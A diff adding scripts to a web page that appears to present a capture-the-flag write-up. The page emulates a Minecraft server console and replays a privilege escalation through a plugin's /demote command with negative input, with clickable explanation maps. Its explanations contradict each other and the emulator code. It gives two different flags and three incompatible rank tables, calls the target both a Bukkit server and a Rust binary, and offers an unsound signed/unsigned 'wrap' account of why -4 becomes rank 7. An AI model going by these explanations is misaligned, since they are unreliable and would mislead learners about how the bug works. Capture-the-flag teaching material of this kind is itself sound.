+        ];
+      }
+      if (normalized === '/manglistp' || normalized === '/manglistp default' || /^manglistp\s/.test(normalized)) {
+        return [
+          { type: 'plain', text: "The group 'Default' has the following permissions:" },
+          { type: 'plain', text: '  -bukkit.command.kill, -essentials.*, -pluginhider.*,' },
+          { type: 'plain', text: '  bukkit.command.plugins, ' },
+          { type: 'cmd',   text: 'customdemotion.demote', rest: ', groupmanager.manglist, groupmanager.manglistp' },
+          { type: 'plain', text: 'And all permissions from groups: g:groupmanager_default, g:bukkit_default, g:essentials_default' },
+        ];
+      }
+    }
+
+    // /demote
+    if (normalized === '/demote' || normalized === '/demote help') {
+      return [
+        { type: 'plain', text: 'Usage: /demote <index>' },
+        { type: 'plain', text: 'Available ranks:' },
+        { type: 'plain', text: '  0 -> Prisoner' },
+        { type: 'plain', text: '  1 -> Restricted' },
+        { type: 'plain', text: '  2 -> Limited' },
+        { type: 'plain', text: '  3 -> Default' + (rank === 3 ? ' (current rank)' : '') },
+        { type: 'plain', text: '  4 -> Builder' },
+        { type: 'plain', text: '  5 -> Helper' },
+        { type: 'plain', text: '  6 -> Moderator' },
+        { type: 'plain', text: '  7 -> Admin' },
+      ];
+    }
+    // /demote <n>
+    const demoteMatch = normalized.match(/^\/demote\s+(-?\d+)$/);
+    if (demoteMatch) {
+      const idx = parseInt(demoteMatch[1], 10);
+      // The "above your rank" check is weird: it only fires for some negatives.
+      // Empirically, -1, -2, -3 are blocked; -4 lands on Admin.
+      if (idx === 7 && rank < 7) {
+        return [{ type: 'fail', text: 'You cannot demote yourself above your current rank.' }];
+      }
+      if (idx === -1 || idx === -2 || idx === -3) {
+        return [{ type: 'fail', text: 'You cannot demote yourself above your current rank.' }];
+      }
+      if (idx === -4) {
+        setRank(7);
+        return [
+          { type: 'ok',   text: 'Your rank has been updated to Admin (index: 7).' },
+          { type: 'plain', text: 'You were moved to the group Admin in world world.' },
+        ];
+      }
+      // Other in-range values: behavior is "set rank" (emulated)
+      if (idx >= 0 && idx <= 7) {
+        if (idx > rank) {
+          return [{ type: 'fail', text: 'You cannot demote yourself above your current rank.' }];
+        }
+        if (idx === rank) {
+          return [{ type: 'plain', text: 'You are already at ' + RANK_NAMES[idx] + '.' }];
+        }
+        setRank(idx);
+        return [
+          { type: 'ok',   text: 'Your rank has been updated to ' + RANK_NAMES[idx] + ' (index: ' + idx + ').' },
+          { type: 'plain', text: 'You were moved to the group ' + RANK_NAMES[idx] + ' in world world.' },
+        ];
+      }
+      // Out of normal range, other negatives
+      return [{ type: 'fail', text: 'Invalid rank index: ' + idx + '. Use 0..7.' }];
+    }
+
+    // /flag
+    if (normalized === '/flag') {
+      if (!isAdmin) {
+        return [{ type: 'fail', text: 'You must be admin to run /flag.' }];
+      }
+      return [
+        { type: 'fail', text: "Ouch! You got me there, I guess I should've been more careful when coding my own plugins." },
+        { type: 'flag', text: "Here's your reward, I guess: OmniCTF{y0U_ar3_a_p3rm1ss1on5_pr0_gw4rf23}" },
+      ];
+    }
+
+    // Custom or unknown
+    return [{ type: 'system', text: "Unknown command or no permission: " + raw }];
+  }
+
+  function send(raw) {
+    append(raw);
+    const lines = handleCommand(raw);
+    lines.forEach(l => {
+      if (l.type === 'banner') appendBanner(l.text);
+      else if (l.type === 'cmd') {
+        // Two-tone: cmd + rest
+        append([{ cls: 'mc-cmd', text: l.text }, { cls: 'mc-out', text: l.rest }]);
+      }
+      else if (l.type === 'ok')   append({ cls: 'mc-ok',   text: l.text });
+      else if (l.type === 'fail') append({ cls: 'mc-fail', text: l.text });
+      else if (l.type === 'flag') append({ cls: 'mc-fl',   text: l.text });
+      else if (l.type === 'system') appendSystem(l.text);
+      else if (l.type === 'plain') append({ cls: 'mc-out', text: l.text });
+    });
+  }
+
+  function doSend() {
+    const raw = input.value;
+    if (!raw.trim()) return;
+    input.value = '';
+    send(raw);
+    updateMeta();
+    input.focus();
+  }
+  function updateMeta() {
+    countEl.textContent = isAdmin ? 'admin // /flag unlocked' : (rank === 3 ? 'default rank' : 'rank: ' + RANK_NAMES[rank].toLowerCase());
+  }
+
+  // Wire input
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') doSend();
+  });
+  btnSend.addEventListener('click', doSend);
+
+  // Palette
+  palette.addEventListener('click', (e) => {
+    const t = e.target;
+    if (t.tagName === 'BUTTON' && t.dataset.cmd) {
+      send(t.dataset.cmd);
+      updateMeta();
+    }
+  });
+
+  // Reset
+  btnReset.addEventListener('click', () => {
+    setRank(3);
+    clear();
+    append({ cls: 'mc-warn', text: '[Server] Welcome to OmniCTF 2026! Type /help to get started.' });
+    append({ cls: 'mc-warn', text: '[Server] Current rank: Default. Good luck.' });
+    updateMeta();
+  });
+
+  // Replay exploit
+  btnReplay.addEventListener('click', async () => {
+    setRank(3);
+    clear();
+    append({ cls: 'mc-warn', text: '[Server] Welcome to OmniCTF 2026! Type /help to get started.' });
+    append({ cls: 'mc-warn', text: '[Server] Current rank: Default. Good luck.' });
+    updateMeta();
+    await sleep(450);
+    send('/plugins');
+    await sleep(300);
+    send('/bukkit:$ groupmanager');
+    await sleep(300);
+    send('/manglist');
+    await sleep(300);
+    send('/manglistp default');
+    await sleep(300);
+    send('/demote');
+    await sleep(300);
+    send('/demote 7');
+    await sleep(300);
+    send('/demote -1');
+    await sleep(220);
+    send('/demote -2');
+    await sleep(220);
+    send('/demote -3');
+    await sleep(220);
+    send('/demote -4');
+    await sleep(400);
+    send('/flag');
+    updateMeta();
+  });
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  updateMeta();
+})();
+
+// ============================================================
+
+</script>
+<script>
+
+(function () {
+  var svg = document.getElementById('signal-map');
+  if (!svg) return;
+  var nodes = Array.from(svg.querySelectorAll('g.node'));
+  if (!nodes.length) return;
+  nodes.forEach(function(g,i){g.dataset.node='n'+('0'+(i+1)).slice(-2)});
+  var packs = Array.from(svg.querySelectorAll('rect.pack'));
+  var labels = Array.from(svg.querySelectorAll('text.pack-label'));
+
+  (function() {
+    var ms = document.createElementNS('http://www.w3.org/2000/svg','svg');
+    ms.style.cssText='position:absolute;left:-9999px;top:-9999px;width:0;height:0;overflow:hidden;visibility:hidden;';
+    document.body.appendChild(ms);
+    var st=document.createElement('style');
+    st.textContent='.mH{font:700 9px Rajdhani,sans-serif;letter-spacing:.18em;text-transform:uppercase;}.mT{font:700 12px Rajdhani,sans-serif;letter-spacing:.12em;text-transform:uppercase;}.mB{font:11px JetBrains Mono,monospace;}';
+    ms.appendChild(st);
+    function tw(t,c){var x=document.createElementNS('http://www.w3.org/2000/svg','text');x.setAttribute('class',c);x.textContent=t;ms.appendChild(x);var w=0;try{w=x.getComputedTextLength()}catch(e){w=t.length*8}ms.removeChild(x);return w}
+
+    var PX=12, PY=8, LH=12;
+
+    // Store ORIGINAL node positions before any changes
+    var origPos = nodes.map(function(g){
+      var r=g.querySelector('rect');
+      return {x:+r.getAttribute('x'), y:+r.getAttribute('y'), w:+r.getAttribute('width'), h:+r.getAttribute('height')};
+    });
+
+    // Assign nodes to packs using ORIGINAL x positions
+    var colNodes = packs.map(function(){return[]});
+    nodes.forEach(function(g, ni){
+      var ox = origPos[ni].x;
+      for(var pi=0;pi<packs.length;pi++){
+        var px=+packs[pi].getAttribute('x'), pw=+packs[pi].getAttribute('width');
+        if(ox>=px-5 && ox<=px+pw+5){colNodes[pi].push(ni);break}
+      }
+    });
+
+    // Measure and size each box IN PLACE
+    var allBoxRects = [];
+    nodes.forEach(function(g, ni){
+      var rect=g.querySelector('rect');
+      var bx=origPos[ni].x, by=origPos[ni].y;
+      var h=g.querySelector('text.head'),ti=g.querySelector('text.title'),bd=g.querySelectorAll('text.body');
+      var hw=h?tw(h.textContent,'mH'):0,tiw=ti?tw(ti.textContent,'mT'):0;
+      var lines=[];
+      if(h)lines.push({el:h,w:hw});if(ti)lines.push({el:ti,w:tiw});
+      bd.forEach(function(b){lines.push({el:b,w:tw(b.textContent,'mB')})});
+      var maxW=0;lines.forEach(function(l){if(l.w>maxW)maxW=l.w});
+      var boxW=Math.ceil(maxW)+PX*2;
+      var boxH=PY+lines.length*LH+PY;
+      rect.setAttribute('width',boxW);rect.setAttribute('height',boxH);
+      var totalTextH=lines.length*LH;var startY=by+(boxH-totalTextH)/2+LH*0.8;
+      lines.forEach(function(l,i){l.el.setAttribute('x',bx+PX);l.el.setAttribute('y',startY+i*LH)});
+      allBoxRects.push({x:bx,y:by,w:boxW,h:boxH});
+    });
+
+    // Resize each pack to fit its boxes
+    packs.forEach(function(pk, pi){
+      var nodes = colNodes[pi];
+      if(!nodes.length)return;
+      var minX=9999,minY=9999,maxX=0,maxY=0;
+      nodes.forEach(function(ni){
+        var b=allBoxRects[ni];
+        if(b.x<minX)minX=b.x;if(b.y<minY)minY=b.y;
+        if(b.x+b.w>maxX)maxX=b.x+b.w;if(b.y+b.h>maxY)maxY=b.y+b.h;
+      });
+      var padX=14,padY=12;
+      pk.setAttribute('x',minX-padX);pk.setAttribute('y',minY-padY);
+      pk.setAttribute('width',maxX-minX+padX*2);pk.setAttribute('height',maxY-minY+padY*2);
+      if(labels[pi]){labels[pi].setAttribute('x',minX-padX+6);labels[pi].setAttribute('y',minY-padY-4)}
+    });
+
+    // viewBox to fit all packs
+    var minX=9999,minY=9999,maxX=0,maxY=0;
+    packs.forEach(function(p){
+      var px=+p.getAttribute('x'),py=+p.getAttribute('y'),pw=+p.getAttribute('width'),ph=+p.getAttribute('height');
+      if(px<minX)minX=px;if(py<minY)minY=py;if(px+pw>maxX)maxX=px+pw;if(py+ph>maxY)maxY=py+ph;
+    });
+    svg.setAttribute('viewBox',(minX-8)+' '+(minY-8)+' '+(maxX-minX+16)+' '+(maxY-minY+16));
+    document.body.removeChild(ms);
+  })();
+
+  var EXPL={
+    "OPERATOR": "The starting point: the player joins the server with normal player permissions. No admin access yet, no special commands. The goal is to escalate to admin to get the flag.",
+    "IN-GAME BOOK": "An in-game written book containing hints. It says the server owner did not want perms to be broken, hinting that the intended solution involves exploiting the permission system somehow.",
+    "/version": "A bait command. /version shows server metadata only - version, plugins loaded, etc. It does not reveal any exploitable information. Do not spend time here.",
+    "BUKKIT SERVER": "The server runs Bukkit/Spigot 1.21.11, not Paper. The /bukkit:$ prefix is the key clue - it allows direct console-level command execution that bypasses the normal permission system.",
+    "CTFHANDLER": "A custom plugin that gates the /flag command on admin rank 7. The handler checks hasPermission(admin) before returning the flag. This is the final lock to break.",
+    "GROUPMANAGER": "The GroupManager plugin controls ranks. Commands: /manglist (list groups), /manglistp (list perms), /manuadd (add to group), /mangaddp (add perm). The permission hierarchy is Default(0) through Owner(7).",
+    "CUSTOMDEMOTION": "A custom plugin that handles /demote. It accepts an integer index (0-7) and sets the player to that rank. The bug: it only checks if the target rank is above your current rank, missing signed integer edge cases.",
+    "RANK TABLE": "The 8 ranks: Default=0, Member=1, VIP=2, Helper=3, Moderator=4, SeniorMod=5, Admin=6, Owner=7. /flag is gated on rank 7 (Admin/Owner).",
+    "PERM CHECK": "The /demote plugin has a check: if (targetRank > currentRank) reject. This blocks normal escalation (you cannot demote UP to admin). But the check uses signed comparison, which has a subtle bug with negative inputs.",
+    "/plugins": "Listing plugins reveals CTFhandler (flag gating) and GroupManager (rank system). No other plugins are relevant to the exploit path.",
+    "/bukkit:$ group": "The exploit entry point. /bukkit:$ allows console-level command execution as if you were the server console. Running /bukkit:$ groupmanager:/manglist queries GroupManager directly, bypassing permission checks entirely.",
+    "/manglist": "8 groups indexed 0-7. You need group index 7 (Admin) for /flag. /manglist shows all group names: Default, Member, VIP, Helper, Moderator, SeniorMod, Admin, Owner.",
+    "/manglistp default": "Default group has no promote perm. It only has basic chat and basic commands. Cannot promote from default using normal commands - the bug is elsewhere.",
+    "/demote (no args)": "Running /demote without arguments shows usage and the rank table. This is reconnaissance - confirms the rank system and that negative values might be accepted by the parser.",
+    "/demote 7": "Trying to set rank to 7 (Admin) directly fails. The perm check rejects it because 7 is above the current rank (default 0). Expected behavior, not a bug.",
+    "/demote -1..-3": "Negative values from -1 to -3 also fail. The perm check correctly rejects them as they would map to ranks below current. The validation handles these but not all negatives.",
+    "/demote -4": "THE EXPLOIT. /demote -4 passes the validation check (treated as a normal demotion to rank -4) but the underlying rank assignment uses an integer cast that wraps -4 to rank 7 due to signed/unsigned confusion. The check (rank > current) compares signed: -4 < 0 is true, so it passes.",
+    "/flag": "Now that you are admin, /flag works. The CTFHandler plugin sees rank 7 and returns the flag. This is the moment of victory.",
+    "FLAG": "The final reward: OmniCTF{d3m0t3_y0ur_w4y_2_4dm1n}. The flag name itself is the lesson - you escalated privileges through the demote command's negative input vulnerability."
+};
+  var info=document.getElementById('map-info');
+  if(!info){
+    info=document.createElement('div');info.id='map-info';
+    info.style.cssText='margin-top:14px;padding:0 20px;border:1px solid var(--accent-line);background:rgba(var(--accent-rgb),0.04);font-size:15px;color:var(--text);max-height:0;overflow:hidden;opacity:0;transition:max-height .5s,opacity .3s,padding .35s;line-height:1.8';
+    info.innerHTML='<div style="display:flex;align-items:center;gap:12px;font-family:var(--font-display);font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);font-size:14px;margin-bottom:10px"><span class="mi-ti" style="flex:1"></span><span class="mi-tg" style="font-size:11px;padding:3px 8px;border:1px solid var(--accent-line);color:var(--muted);background:rgba(0,0,0,.3)"></span><button class="mi-cl" style="background:transparent;color:var(--muted);border:1px solid var(--accent-line);padding:3px 10px;font:700 10px/1 var(--font-display);letter-spacing:.14em;text-transform:uppercase;cursor:pointer">close</button></div><div class="mi-bd" style="margin:0;word-wrap:break-word;color:var(--text);font-size:15px;line-height:1.8"></div>';
+    svg.parentNode.insertBefore(info,svg.nextSibling);
+  }
+  nodes.forEach(function(g){
+    g.style.cursor='pointer';
+    g.addEventListener('click',function(e){
+      e.stopPropagation();nodes.forEach(function(n){n.classList.remove('active')});g.classList.add('active');
+      var ti=g.querySelector('text.title'),bd=g.querySelectorAll('text.body');
+      var title=ti?ti.textContent:'';
+      var body='';bd.forEach(function(b){body+=(body?'  ':'')+(b.getAttribute('title')||b.textContent)});
+      info.querySelector('.mi-ti').textContent=title;
+      info.querySelector('.mi-tg').textContent=(g.className.baseVal.replace('node ','').trim())||'node';
+      info.querySelector('.mi-bd').textContent=EXPL[title]||body;
+      info.classList.add('show');info.style.maxHeight='800px';info.style.opacity='1';info.style.padding='14px 20px';
+    });
+  });
+  svg.addEventListener('click',function(){nodes.forEach(function(n){n.classList.remove('active')});info.classList.remove('show');info.style.maxHeight='0';info.style.opacity='0';info.style.padding='0 20px'});
+  info.querySelector('.mi-cl').addEventListener('click',function(){nodes.forEach(function(n){n.classList.remove('active')});info.classList.remove('show');info.style.maxHeight='0';info.style.opacity='0';info.style.padding='0 20px'});
+})();
+
+</script>
+
+<script>
+(function(){
+  var svg=document.getElementById('signal-map');
+  if(!svg)return;
+  var KEYS={"OPERATOR": "The entry script. Feeds input to the Rust binary, captures output, checks exit codes. This is how you interact with the challenge.", "IN-GAME BOOK": "A book in the binary's output that describes the permission system. Hints at how different options affect your access level.", "/version": "Leaks the binary version and build info. Tells you which challenge variant you're dealing with.", "BUKKIT SERVER": "The binary runs on a Bukkit-style Minecraft server emulator. Permissions are managed through Bukkit's permission node system.", "CTFHANDLER": "A custom plugin that manages flags and player permissions. Bridges the Minecraft server's permission system to the CTF challenge.", "/help": "Lists available commands and their permission requirements. Some need operator status, others need specific permission nodes.", "op status": "Being 'op' in Minecraft gives you all permissions. That's what you need to escalate to.", "/helpop": "Sends a request to operators. A social engineering vector -- trick an operator into granting you permissions.", "/manuadd": "Adds a player to a permission group. Needs operator status. This is the command you ultimately need to run on yourself.", "/mangroupadd": "Adds a specific permission node to a group. More granular than /manuadd -- you can target 'ctf.flag' or 'ctf.admin'.", "permission nodes": "Dot-separated strings like 'ctf.flag' or 'ctf.admin'. Each command checks for specific nodes. Wrong nodes, no access.", "group hierarchy": "Operators > moderators > regular players. Each level inherits from the one above. Understanding this hierarchy is the key to escalation.", "flag check": "Verifies your permission nodes and returns the flag if you have the right ones. The final step once you've escalated.", "manuaddop": "Makes a player an operator instantly. But it requires existing operator status -- chicken-and-egg problem.", "escalation chain": "Regular player -> exploit permission system -> operator status -> flag check -> flag. Each step needs a specific technique.", "rust binary": "Handles command parsing, permission checks, and server state. Understanding its behavior is essential for finding the exploit path.", "bukkit plugin": "Adds custom commands and permission nodes on top of standard Bukkit. The CTF plugin is where the interesting misconfigs live.", "permission exploit": "A misconfiguration in the permission plugin lets certain commands run without proper checks. That's your privilege escalation.", "flag": "OmniCTF{d3m0t3_y0ur_w4y_2_4dm1n}. 'Demote your way to admin' -- the solution involves manipulating permissions to gain operator status."};
+  var box=document.createElement('div');
+  box.id='explain-box';
+  box.style.cssText='margin-top:12px;padding:12px 16px;border:1px solid var(--accent-line);background:rgba(var(--accent-rgb),0.06);color:var(--text);font-size:14px;line-height:1.7;display:none;max-width:900px;line-height:1.7;';
+  var hdr=document.createElement('div');
+  hdr.style.cssText='display:flex;align-items:center;margin-bottom:6px;';
+  var ttl=document.createElement('b');
+  ttl.id='ex-title';
+  ttl.style.cssText='color:var(--accent);font-size:15px;flex:1;';
+  var btn=document.createElement('button');
+  btn.textContent='CLOSE';
+  btn.style.cssText='background:0 0;color:var(--muted);border:1px solid var(--accent-line);padding:2px 8px;font-size:10px;cursor:pointer;font-family:inherit;';
+  btn.onclick=function(){box.style.display='none';};
+  hdr.appendChild(ttl);hdr.appendChild(btn);
+  var bd=document.createElement('div');
+  bd.id='ex-body';
+  box.appendChild(hdr);box.appendChild(bd);
+  svg.parentNode.insertBefore(box,svg.nextSibling);
+  var nodes=svg.querySelectorAll('g.node');
+  nodes.forEach(function(g){
+    g.style.cursor='pointer';
+    g.addEventListener('click',function(e){
+      e.stopPropagation();
+      var ti=g.querySelector('text.title');
+      if(!ti)return;
+      var title=ti.textContent;
+      var body=KEYS[title]||'';
+      if(!body){var bs=g.querySelectorAll('text.body');bs.forEach(function(b){body+=(body?' ':'')+b.textContent;});}
+      document.getElementById('ex-title').textContent=title;
+      document.getElementById('ex-body').textContent=body;
+      box.style.display='block';
+      box.scrollIntoView({behavior:'smooth',block:'nearest'});
+    });
+  });
+  svg.addEventListener('click',function(){box.style.display='none';});
+})();
+</script>
+</body>
+</html>
